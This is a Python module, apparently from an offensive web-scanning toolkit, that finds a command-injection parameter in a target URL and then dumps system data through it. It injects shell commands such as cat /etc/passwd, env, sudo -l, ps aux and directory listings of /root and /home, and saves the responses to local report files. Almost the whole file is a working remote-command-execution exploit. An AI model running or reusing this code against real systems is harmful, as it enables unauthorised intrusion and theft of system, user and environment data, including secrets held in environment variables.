"""rce_dump — data extraction via RCE (ls, cat, download)"""
import os
from core.http import HttpClient
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

COMMANDS = [
    ("whoami", "id"),
    ("uname", "uname -a"),
    ("pwd", "pwd"),
    ("ls_root", "ls -la /"),
    ("ls_tmp", "ls -la /tmp"),
    ("ls_home", "ls -la /root 2>/dev/null || ls -la /home"),
    ("etc_passwd", "cat /etc/passwd"),
    ("etc_hosts", "cat /etc/hosts"),
    ("env", "env"),
    ("ps", "ps aux"),
    ("netstat", "netstat -an 2>/dev/null || ss -an"),
    ("users", "cat /etc/passwd | cut -d: -f1"),
    ("sudo", "sudo -l 2>/dev/null"),
    ("cron", "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null"),
]

class RceDump:
    def run(self, session, logger):
        target = session.target
        http = HttpClient(session, logger)
        u = urlparse(target)
        params = parse_qs(u.query) or {}

        # find injectable param
        param = None
        for name in params:
            q = dict(params); q[name] = ["; echo OMNI_RCE_MARKER"]
            url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
            r = http.get(url)
            if r and "OMNI_RCE_MARKER" in r.text:
                param = name
                break
        if not param:
            print("[rce_dump] no injectable param (try LFI→RCE first)")
            return {}

        print(f"[rce_dump] vulnerable: {param}")
        out_dir = Path("reports") / "dump" / "rce"
        out_dir.mkdir(parents=True, exist_ok=True)
        dumped = {}

        for name, cmd in COMMANDS:
            payload = f"; {cmd}; echo END_OMNI"
            q = dict(params); q[param] = [payload]
            url = urlunparse(u._replace(query=urlencode(q, doseq=True)))
            r = http.get(url)
            if not r: continue
            # extract between markers if used, otherwise whole body
            body = r.text
            if "END_OMNI" in body:
                body = body.split("END_OMNI")[0].split("; ")[-1]
            (out_dir / f"{name}.txt").write_text(body[:20000])
            dumped[name] = len(body)
            print(f"  [+] {name}: {body[:80].strip()}")
            logger.finding("rce_dump", "critical", f"{name}: {body[:100]}")

        print(f"[rce_dump] {len(dumped)} outputs saved")
        return {"dumped": list(dumped.keys())}
